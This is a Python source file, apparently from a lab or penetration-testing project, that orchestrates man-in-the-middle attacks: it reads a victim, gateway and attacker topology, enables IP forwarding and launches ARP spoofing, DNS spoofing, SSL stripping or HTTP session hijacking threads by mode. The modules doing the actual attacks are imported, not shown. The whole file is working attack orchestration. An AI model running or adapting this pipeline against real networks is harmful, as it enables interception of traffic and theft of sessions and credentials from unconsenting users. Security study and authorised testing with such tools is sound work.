"""
src/core/mitm_pipeline.py: Orchestrates MITM attacks.
"""

import time
import os

from src.attacks.arp_spoofing import start_arp_spoof
from src.attacks.dns_spoofing import DnsSpoofingAttack
from src.attacks.HTTP_session_hijacking import HTTPSessionHijacker
from src.attacks.ssl_strip import start_sslstrip
from .config import load_config
from .network import enable_ip_forwarding

class Colors:
    RESET = "\033[0m"       # Reset color to default
    BOLD = "\033[1m"        # Bold text
    UNDERLINE = "\033[4m"   # Underlined text
    RED = "\033[31m"        # Red text
    GREEN = "\033[32m"      # Green text
    YELLOW = "\033[33m"     # Yellow text
    BLUE = "\033[34m"       # Blue text
    MAGENTA = "\033[35m"    # Magenta text
    CYAN = "\033[36m"       # Cyan text
    WHITE = "\033[37m"      # White text


def log_with_color(msg: str, color: str) -> None:
    """Print messages with colors."""
    print(f"{color}{msg}{Colors.RESET}")

def teardown_pipeline(running_threads: dict):
    """Stops all attack threads + disables IP forwarding."""
    print("\n[INFO] Starting MITM teardown...")

    for name, thread in running_threads.items():
        try:
            if hasattr(thread, "is_alive") and thread.is_alive():
                print(f"[INFO] Stopping {name}...")
                if hasattr(thread, "stop"):
                    thread.stop()
                thread.join(timeout=5)
                if thread.is_alive():
                    print(f"[WARNING] {name} did not terminate within timeout.")
        except Exception as e:
            print(f"[WARNING] Teardown issue for {name}: {e}")

    # Disable IP forwarding
    try:
        if os.name == "posix":
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("0")
            print("[INFO] IP forwarding disabled.")
    except Exception as e:
        print(f"[ERROR] Failed disabling IP forwarding: {e}")

    print("[INFO] Teardown complete.")


def run(mode: str):
    """Runs the MITM pipeline."""
    config = load_config()
    running_threads = {}

    audit_dir = os.getcwd()

    print("[INFO] Loaded topology config.")
    print(f"[INFO] Mode requested: {mode!r}")

    try:
        # Enable IP forwarding
        if not enable_ip_forwarding():
            raise RuntimeError("IP forwarding could not be enabled!")

        victim_ip = config["victim"]["ip"]
        gateway_ip = config["gateway"]["ip"]
        attacker_iface = config["attacker"]["interface"]
        attacker_ip = config["attacker"]["ip"]
        domain_name = config["domain"]["name"]

        log_with_color("[INFO] Topology:", Colors.YELLOW)
        print(f"       victim   : {victim_ip}")
        print(f"       gateway  : {gateway_ip}")
        print(f"       attacker : {attacker_ip} ({attacker_iface})")
        print(f"       domain   : {domain_name}")
        print(f"[INFO] Evidence/Audit directory: {audit_dir}")

        # ARP SPOOFING
        if mode == "arp":
            # Demo mode -> show ARP control panel
            print("[INFO] Starting ARP spoofing (DEMO mode)...")
            arp_spoofer = start_arp_spoof(
                victim_ip,
                gateway_ip,
                attacker_iface,
                audit_dir=audit_dir,
                dependents=[],
                prerequisite_mode=False,
            )
            if not arp_spoofer:
                raise RuntimeError("ARP Spoofer failed to start.")
            running_threads["arp"] = arp_spoofer

        elif mode in {"dns", "ssl", "session"}:
            # Prerequisite mode -> silent ARP MITM
            print("[INFO] Starting ARP spoofing (prerequisite mode)...")
            arp_spoofer = start_arp_spoof(
                victim_ip,
                gateway_ip,
                attacker_iface,
                audit_dir=audit_dir,
                dependents=[mode],
                prerequisite_mode=True,
            )
            if not arp_spoofer:
                raise RuntimeError("ARP Spoofer failed to start.")
            running_threads["arp"] = arp_spoofer
        
        if mode == "dns":
            print("[INFO] Starting ARP spoofing (victim <-> DNS, prerequisite mode)...")
            arp_dns = start_arp_spoof(
                victim_ip,
                config["dns"]["ip"],
                attacker_iface,
                audit_dir=audit_dir,
                dependents=["dns"],
                prerequisite_mode=True,
            )
            if not arp_dns:
                raise RuntimeError("ARP Spoofer (DNS) failed to start.")
            running_threads["arp_dns"] = arp_dns

        # DNS SPOOFING
        if mode == "dns":
            print("[INFO] Starting DNS spoofing module...")
            dns_spoofer = DnsSpoofingAttack(
                domain=domain_name,
                fake_ip=attacker_ip,
                victim_ip=victim_ip,
                interface=attacker_iface,
                dns_ip=config["dns"]["ip"],
            )
            dns_spoofer.start()
            running_threads["dns"] = dns_spoofer

        # SSL STRIPPING
        if mode == "ssl":
            print("[INFO] Starting SSL stripping module...")
            real_https_ip = config["domain"]["https_ip"]
            ssl_stripper = start_sslstrip(
                domain=domain_name,
                real_ip=real_https_ip,
            )
            if not ssl_stripper:
                raise RuntimeError("SSL Strip failed to start.")
            running_threads["ssl"] = ssl_stripper

        # HTTP SESSION HIJACKING
        if mode == "session":
            print("[INFO] Starting HTTP session hijacking module...")
            hijacker = HTTPSessionHijacker(
                target_domain=domain_name,
                target_ip=attacker_ip,
                victim_ip=victim_ip,
                interface=attacker_iface,
            )
            hijacker.start()

            # GUI only if available
            if hijacker.gui:
                hijacker.gui.mainloop()

            running_threads["session"] = hijacker

        # Keep Pipeline alives
        print(f"\n[INFO] MITM pipeline running: {list(running_threads.keys())}")
        print("[INFO] Press Ctrl+C to stop.\n")

        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("\n[INTERRUPT] Ctrl+C pressed by user.")
    except Exception as e:
        print(f"[FATAL ERROR] {e}")
    finally:
        teardown_pipeline(running_threads)


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 -m src.core.mitm_pipeline <mode>")
        print("Modes: arp, dns, session, ssl")
        sys.exit(1)

    mode = sys.argv[1]
    run(mode)
